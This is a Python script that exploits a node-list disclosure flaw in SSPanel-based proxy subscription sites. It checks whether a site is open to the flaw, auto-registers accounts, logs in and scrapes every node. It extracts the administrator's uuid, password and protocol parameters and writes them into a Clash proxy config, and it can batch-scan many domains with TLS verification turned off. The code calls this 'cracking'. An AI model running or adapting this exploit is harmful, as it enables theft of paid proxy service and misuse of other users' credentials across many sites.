# -*- coding: utf-8 -*-

# @Author  : wzdnzd
# @Time    : 2022-05-20

import argparse
import json
import os
import re
import ssl
import sys
import urllib
import urllib.parse
import urllib.request
import warnings

import yaml

warnings.filterwarnings('ignore')

HEADER = {
    "user-agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.39",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "zh-CN,zh;q=0.9",
    "dnt": "1",
    "Connection": "keep-alive",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest"
}

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

PATH = os.path.abspath(os.path.dirname(__file__))

"""
原理: https://bulianglin.com/archives/getnodelist.html
"""

def convert(chars: bytes, filepath: str = "", persist: bool = False) -> list:
    if not chars:
        return []
    try:
        uuid = ""
        contents = json.loads(chars)["nodeinfo"]
        nodes_muport = contents["nodes_muport"]
        admin = {}
        if nodes_muport:
            user = nodes_muport[0]["user"]
            if user and "uuid" in user:
                uuid = user["uuid"]
                properties = ["id", "passwd", "method", "protocol", "protocol_param", "obfs", "obfs_param", "port"]
                for k in properties:
                    admin[k] = user[k]

            if persist and filepath:
                os.makedirs(os.path.dirname(filepath), exist_ok=True)
                with open(filepath, "w+") as f:
                    f.write(chars.decode('unicode_escape'))
                    f.flush()

        if not uuid:
            print("[warning] uuid is empty")

        arrays = []
        nodes = contents["nodes"]
        for node in nodes:
            if node["online"] != -1:
                result = parse(node["raw_node"], uuid, admin)
                if result:
                    arrays.append(result)
        return arrays
    except Exception as e:
        print("convert failed: {}".format(str(e)))
        return []

def parse_v2ray(node: dict, uuid: str) -> dict:
    if not uuid:
        return None
        
    result = {
        "name": node.get("name"),
        "type": "vmess",
        "uuid": uuid,
        "cipher": "auto",
        "tls": False,
        "skip-cert-verify": False
    }

    server = node.get("server")
    if "tls" in server:
        print("tls: {}".format(server))

    items = server.split(";")
    result["alterId"] = int(items[2])
    result["network"] = items[3]

    host = items[0]
    port = int(items[1])

    if len(items) > 5:
        obfs = items[5]
        opts = {}
        if obfs != None and obfs.strip() != "":
            for s in obfs.split("|"):
                words = s.split("=")
                if len(words) != 2:
                    continue

                if words[0] == "server":
                    host = words[1]
                elif words[0] == "outside_port":
                    port = int(words[1])
                elif words[0] == "path":
                    opts["path"] = words[1]
                elif words[0] == "host":
                    opts["headers"] = {"Host": words[1]}

        if opts:
            result["ws-opts"] = opts
    
    result["server"] = host
    result["port"] = port
    return result

def parse_ss(node: dict, user: dict) -> dict:
    host = ""
    port = int(user["port"])

    server = node.get("server", "")
    # https://github.com/EmiyaTKK/Malio-Theme-for-SSPANEL/blob/54d85d75a180a198a7a46800738e8de0c95f1cd5/app/Utils/Tools.php#L607
    if ";" not in server:
        host = server
    else:
        contents = server.split(";")
        host = contents[0]
        info = contents[1].split("|")[0]
        chars = info.split("=")[1]
        if "#" not in chars:
            port = int(chars)
        else:
            port = int(chars.split("#")[1])

    if user.get("obfs", "") == "tls1.2_ticket_auth_compatible":
        user["obfs"] = "tls1.2_ticket_auth"

    result = {
        "name": node.get("name"),
        "server": host,
        "port": port,
        "type": "ssr",
        "cipher": user["method"],
        "password": user["passwd"],
        "protocol": user["protocol"],
        "obfs": user["obfs"],
        "protocol-param": "{}:{}".format(user["id"], user["passwd"]),
        "obfs-param": user["obfs_param"]
    }
    
    result["server"] = host
    result["port"] = port
    return result

def parse(node: dict, uuid: str, user: dict = None) -> dict:
    if not node:
        return None

    # https://github.com/EmiyaTKK/Malio-Theme-for-SSPANEL/blob/54d85d75a180a198a7a46800738e8de0c95f1cd5/app/Utils/URL.php#L242
    num = int(node["sort"])
    if num in [11, 12]:
        return parse_v2ray(node, uuid)
    elif num in [0, 10]:
        return parse_ss(node, user)
    else:
        print("cannot parse, server={}\ttype={}".format(node.get("server"), "ss" if num==13 else "trojan"))
        return None
    

def login(url, params, headers, retry):
    try:
        data = urllib.parse.urlencode(params).encode(encoding="UTF8")
        request = urllib.request.Request(url, data=data, headers=headers, method="POST")

        response = urllib.request.urlopen(request, context=CTX)
        if response.getcode() == 200:
            return response.getheader("Set-Cookie")
        else:
            print("[LoginError]: {}".format(response.read().decode("unicode_escape")))

    except Exception as e:
        print("[LoginError]: {}".format(str(e)))
        retry -= 1

        if retry > 0:
            login(url, params, headers, retry)

        return ""

def register(url: str, params: dict, retry: int) -> bool:
    try:
        data = urllib.parse.urlencode(params).encode(encoding="UTF8")
        request = urllib.request.Request(url, data=data, method="POST", headers=HEADER)

        response = urllib.request.urlopen(request, context=CTX)
        if response.getcode() == 200:
            content = response.read()
            kv = json.loads(content)
            if "ret" in kv and kv["ret"] == 1:
                return True
            else:
                print("[RegisterError]: {}".format(content.decode('unicode_escape')))
                return False

        else:
            print("[RegisterError]: {}".format(response.read().decode("unicode_escape")))

    except Exception as e:
        print("[RegisterError]: {}".format(str(e)))
        retry -= 1

        if retry > 0:
            register(url, params, retry)

        return False

def reload(url: str, config: str):
    if not (os.path.exists(config) and os.path.isfile(config)):
        print("config file not exists, path: {}".format(config))
        return

    header = {"Content-Type": "application/json"}
    params = {"path": config}

    try:
        data = bytes(json.dumps(params), encoding="utf8")
        request = urllib.request.Request(url, data=data, headers=header, method="PUT")

        response = urllib.request.urlopen(request, context=CTX)
        if response.getcode() == 204:
            print("reload clash successed")
        else:
            print(response.read().decode("UTF8"))

    except Exception as e:
        print(str(e))

def get_cookie(text):
    regex = "(__cfduid|uid|email|key|ip|expire_in)=(.+?);"
    if not text:
        return ''

    content = re.findall(regex, text)
    cookie = ';'.join(['='.join(x) for x in content]).strip()

    return cookie

def fetch_nodes(domain: str, email: str, passwd: str) -> bytes:
    try:
        login_url = domain + "/auth/login"
        HEADER["origin"] = domain
        HEADER["referer"] = login_url

        user_info = {
            "email": email,
            "passwd": passwd
        }

        text = login(login_url, user_info, HEADER, 3)
        cookie = get_cookie(text)
        if not text or len(cookie) <= 0:
            raise ValueError("cannot fetch nodes info because login failed")

        HEADER.pop("origin")
        HEADER.pop("referer")
        HEADER["cookie"] = cookie

        request = urllib.request.Request(domain + "/getnodelist", headers=HEADER)
        response = urllib.request.urlopen(request, context=CTX)
        if response.getcode() == 200:
            return response.read()
        else:
            print("[FetchError]: {}".format(response.read().decode('unicode_escape')))
    except Exception as e:
        print("[FetchError]: {}".format(str(e)))
    
    return None

def check(domain: str) -> bool:
    try:
        request = urllib.request.Request(domain + "/getnodelist", headers=HEADER)
        response = urllib.request.urlopen(request, context=CTX)
        if response.getcode() == 200:
            content = json.loads(response.read())
            return "ret" in content and content["ret"] == -1
    except Exception as e:
        print("[CheckError]: {}".format(str(e)))
    
    return False

def extract_domain(url):
    if not url or not re.match('^(https?:\/\/(([a-zA-Z0-9]+-?)+[a-zA-Z0-9]+\.)+[a-zA-Z]+)(:\d+)?(\/.*)?(\?.*)?(#.*)?$', url):
        return ""

    start = url.find("//")
    if start == -1:
        start = -2

    end = url.find("/", start + 2)
    if end == -1:
        end = len(url)

    return url[:end]

def scan(domain: str, file: str, args: argparse.Namespace):
    # 检测是否符合条件
    if not check(domain):
        print("cannot crack, domain: {}".format(domain))
        return
    
    if not args.skip and "@" in args.email:
        register_url = domain + "/auth/register"
        params = {"name": args.email.split("@")[0], "email": args.email, "passwd": args.passwd, "repasswd": args.passwd}
        
        # 注册失败后不立即返回 因为可能已经注册过
        if not register(register_url, params, 3):
            print("register failed, domain: {}".format(domain))

    # 获取机场所有节点信息
    content = fetch_nodes(domain, args.email, args.passwd)
    filepath = os.path.join(args.path, "{}.json".format(domain.split("/")[2]))
    nodes = convert(content, filepath, args.keep)
    if not nodes:
        print("cannot found any proxy node, domain: {}".format(domain))
        return

    proxies = {"proxies": nodes}

    if not file:
        print(json.dumps(proxies))
        return

    os.makedirs(os.path.dirname(file), exist_ok=True)
    with open(file, 'w+', encoding='utf-8') as f:
        yaml.dump(proxies, f, allow_unicode=True)
    
    print("found {} nodes, domain: {}".format(len(nodes), domain))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-r",
        "--reload",
        dest="reload",
        action="store_true",
        help="reload clash config"
    )

    parser.add_argument(
        "-s",
        "--skip",
        dest="skip",
        action="store_true",
        help="skip register"
    )

    parser.add_argument(
        "-b",
        "--batch",
        dest="batch",
        action="store_true",
        help="read domains from file and batch check"
    )

    parser.add_argument(
        "-k",
        "--keep",
        dest="keep",
        action="store_true",
        help="save nodes list information if true"
    )

    parser.add_argument(
        "-a",
        "--address",
        type=str,
        required=False,
        default="",
        help="airport domain"
    )

    parser.add_argument(
        "-e",
        "--email",
        type=str,
        required=False,
        default="",
        help="username or email"
    )

    parser.add_argument(
        "-p",
        "--passwd",
        type=str,
        required=False,
        default="",
        help="password"
    )

    parser.add_argument(
        "-f",
        "--file",
        type=str,
        required=False,
        default="",
        help="subscribe file saved path"
    )

    parser.add_argument(
        "-u",
        "--url",
        type=str,
        required=False,
        default="http://127.0.0.1:9090/configs?force=true",
        help="clash controller api"
    )

    parser.add_argument(
        "-d",
        "--path",
        type=str,
        required=False,
        default=PATH,
        help="directory for save result"
    )

    parser.add_argument(
        "-c",
        "--config",
        type=str,
        required=False,
        default="",
        help="clash config path"
    )

    args = parser.parse_args()
    if args.batch:
        if not (os.path.exists(args.address) and os.path.isfile(args.address)):
            print("select batch mode, but file not found, path: {}".format(args.address))
            sys.exit(-1)

        tasks = []
        with open(args.address, "r") as f:
            for line in f.readlines():
                domain = extract_domain(line)
                if not domain:
                    print("skip invalidate domain, url: {}".format(line))
                    continue

                filepath = os.path.join(args.path, "{}.yaml".format(domain.split("/")[2]))
                tasks.append((domain, filepath, args))

        import multiprocessing     
        cpu_count = multiprocessing.cpu_count()
        num = len(tasks) if len(tasks) <= cpu_count else cpu_count

        pool = multiprocessing.Pool(num)
        pool.starmap(scan, tasks)
        pool.close()
    else:
        domain = extract_domain(args.address)
        if not domain:
            print("skip invalidate domain, url: {}".format(args.address))
            sys.exit(-1)

        scan(domain, args.file, args)
    
    # 重载clash配置
    if args.reload:
        reload(args.url, args.config)